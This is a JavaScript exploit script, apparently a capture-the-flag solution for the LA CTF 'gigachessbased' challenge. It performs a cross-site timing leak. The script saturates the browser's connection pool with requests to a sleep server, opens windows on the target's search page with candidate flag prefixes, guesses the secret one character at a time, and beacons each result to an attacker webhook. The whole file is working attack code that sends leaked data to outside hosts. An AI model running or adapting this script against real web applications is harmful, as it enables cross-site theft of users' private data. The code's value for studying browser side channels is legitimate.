// const time_limit = 300;
const time_limit = 80;

// sleepserver is hosted sleepserver from solve/
// url is the url of the page (should be like something.lac.tf)
const sleepserver = (port, end) => `https://<REDACTED>:${port}${end}`;
const webhook = '<REDACTED>';
// const url = 'https://cd50-2607-f010-2a7-1b-4228-29b9-e84c-7ec4.ngrok-free.app/';
// const url = 'https://ab94-2607-f010-2a7-1b-4228-29b9-e84c-7ec4.ngrok-free.app/';
// const url = 'https://chessbased.chall.lac.tf/';
// const url = 'https://c2b7-2607-f010-2a7-1b-4228-29b9-e84c-7ec4.ngrok-free.app/';
const url = 'https://gigachessbased.chall.lac.tf/';

// const w = window.open('/timer.html', '', 'height=570,width=520');
const w = window.open('/timer.html');

const block = async () => {
  var revive = () => fetch(sleepserver(5001, '/revive?x=1'));
  await revive();
  var promises = [];
  window.controller = new AbortController();
  for (let i = 0; i < 255; ++i) {
    promises.push(fetch(
      sleepserver(5100 + i, '/sleep?x=1'),
      { mode: 'no-cors', signal: controller.signal }
    ).catch(r => 'owo'));
  }
  await Promise.all(promises);
  console.log('blocking finished');
};

const waitForBlock = async () => {
  while (1) {
    const resp = await fetch(sleepserver(5400, '/info')).then(r => r.json());
    if (resp.n >= 255) break;
    await new Promise(res => setTimeout(res, 500));
  }
};

const unblock = () => fetch(sleepserver(5001, '/kill?x=1'));


const test = async (query, i) => {
  xs[i].location.replace(`${url}#/search?q=${encodeURIComponent(query)}`);
  setTimeout(() => {
    w.postMessage('rawr');
  }, 1);
};

const timeChar = async (ch) => {
  times.splice(0, times.length);
  document.querySelector('.candidate').textContent = exfil + ch;

  for (let i = 0; i < n; ++i) {
    if (stop) {
      w.close();
      return;
    }
    await test(exfil + ch, i);
    // await new Promise(res => setTimeout(res, wait));
    if (!isBlocked) break;
  }
  if (!isBlocked) {
    await forceBlock();
    return await timeChar(ch);
  }

  while (times.length != n) {
    await new Promise(res => setTimeout(res, 10));
  };

  const avg = times.reduce((l, r) => l + r, 0) / times.length;
  const min = Math.min(...times); console.log({ ch, avg, min });
  if (isNaN(avg) || times.length != n) {
    return await timeChar(ch);
  }

  return { ch, avg, min };
};

const forceBlock = async () => {
  while (!isBlocked) {
    await unblock();
    block().then(() => (isBlocked = false));
    await waitForBlock();
    isBlocked = true;
  }
};


const times = [];
window.addEventListener('message', (e) => {
  const msg = JSON.parse(e.data);
  // console.log(msg.delta);
  times.push(msg.delta);
});

let isBlocked = false;
let exfil = 'lactf{';
const alpha = 'abcdefghijklmnopqrstuvwxyz01234567890_{}';
// const alpha = 't0_b4s3dtchf2k}';
// test exfiltrating Ruy lopez
// let exfil = 'Ru';
// const alpha = 'abcdefghijklmnopqrstuvwxyz RUYLO';

let maxch = '';
let maxchtime = 0;
let minchtime = 10000;
let stop = false;

// const n = 10;
const n = 4;
const wait = 300;

const xs = []
for (let i = 0; i < n; ++i) {
  // xs[i] = window.open(url, '', 'height=570,width=520');
  xs[i] = window.open(url);
};


window.stoppp = () => (stop = true);

fetch(webhook, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    mode: 'no-cors',
    body: JSON.stringify({ cmd: 'load' })
}).catch(() => {});


setTimeout(() => {
  fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      mode: 'no-cors',
      body: JSON.stringify({ cmd: 'unload', best })
    }).catch(() => {});

  for (let i = 0; i < xs.length; ++i) {
    xs[i].close();
  }
  w.close();
  stoppp()
}, (time_limit - 5) * 1000);

(async () => {

  try {
    w.location.replace
  } catch (e) {
    fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      mode: 'no-cors',
      body: JSON.stringify({ cmd: 'no-popup' })
    }).catch(() => {});
    return;
  }

  await unblock();
  while (!exfil.includes(alpha[alpha.length - 1])) {
    while (!isBlocked) {
      await forceBlock();
    }

    let alphai = 0;
    const best = [];
    window.best = best;
    while (alphai < alpha.length + 4) {
      const ch = alpha[alphai % alpha.length];
      const { min } = await timeChar(ch);
      if (stop) return;
      best.push({ ch, min });
      times.splice(0, times.length);
      alphai++;
    }
    best.sort((l, r) => r.min - l.min);

    // reset hash
    // await timeChar('');

    for (let i = 0; i < 2; ++i) {
      const { ch } = best[i];

      if (ch == alpha[3]) {
        await timeChar('');
      }
      const { min } = await timeChar(ch);
      if (min > maxchtime) {
        maxch = ch;
        maxchtime = min;
      }
    };
    console.log({ maxch });
    exfil += maxch;
    maxch = '';
    maxchtime = 0;
    minchtime = 10000;
    console.log({ exfil });
    document.querySelector('.exfil').textContent = exfil;
    navigator.sendBeacon(webhook, JSON.stringify({ exfil, best }));
    // fetch(webhook, {
    //   method: 'POST',
    //   headers: { 'Content-Type': 'application/json' },
    //   mode: 'no-cors',
    //   body: JSON.stringify({ exfil, best })
    // }).catch(() => {});
  }

  // await new Promise(res => setTimeout(res, 10000));
  w.close();
})();

